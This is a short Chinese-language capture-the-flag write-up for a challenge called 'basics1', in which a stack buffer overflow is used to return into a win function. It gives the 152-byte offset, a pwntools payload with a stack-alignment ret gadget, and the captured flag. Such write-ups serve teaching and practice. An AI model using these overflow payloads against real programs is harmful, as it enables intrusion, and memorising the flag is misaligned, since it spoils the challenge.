# basics1

## 题目简述

程序把过长输入读入栈缓冲区，二进制中另有可直接打印 flag 的 `win` 函数。保护与调用条件允许标准 ret2win。

## 解题过程

用循环模式确定从输入开头到保存返回地址的偏移为 152 字节。payload 由填充、必要的栈对齐 `ret` 和 `win` 地址组成：

```python
payload = b"A" * 152
payload += p64(ret_gadget)
payload += p64(elf.symbols["win"])
```

覆盖返回地址后，函数返回进入 `win`，得到：

```text
n00bz{b4s1c_r3t_t0_w1n_f0r_7he_w1n!}
```

## 方法总结

ret2win 的核心验证项是精确偏移、目标函数地址和 ABI 栈对齐。不要凭反编译器显示的缓冲区大小直接猜偏移；保存的基址、编译器填充都会改变实际布局。
